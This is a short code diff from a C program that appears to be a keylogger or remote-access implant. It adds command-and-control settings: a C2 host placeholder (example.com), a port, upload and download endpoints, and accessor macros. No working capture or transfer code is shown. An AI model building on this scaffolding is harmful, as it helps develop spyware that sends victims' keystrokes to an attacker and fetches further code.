@@ -26,6 +26,27 @@
 #define BUFFER_SIZE 4096
 #define MAX_KEYLOG_SIZE 8192
 
+#ifndef C2_HOST
+    #define C2_HOST "example.com"
+#endif
+
+#ifndef C2_PORT
+    #define C2_PORT 443
+#endif
+
+#ifndef UPLOAD_ENDPOINT
+    #define UPLOAD_ENDPOINT "/api/upload"
+#endif
+
+#ifndef DOWNLOAD_ENDPOINT
+    #define DOWNLOAD_ENDPOINT "/api/download"
+#endif
+
+#define GET_C2_HOST() C2_HOST
+#define GET_C2_PORT() C2_PORT
+#define GET_UPLOAD_ENDPOINT() UPLOAD_ENDPOINT
+#define GET_DOWNLOAD_ENDPOINT() DOWNLOAD_ENDPOINT
+
 typedef struct {
     char c2_url[256];
     char upload_endpoint[128];
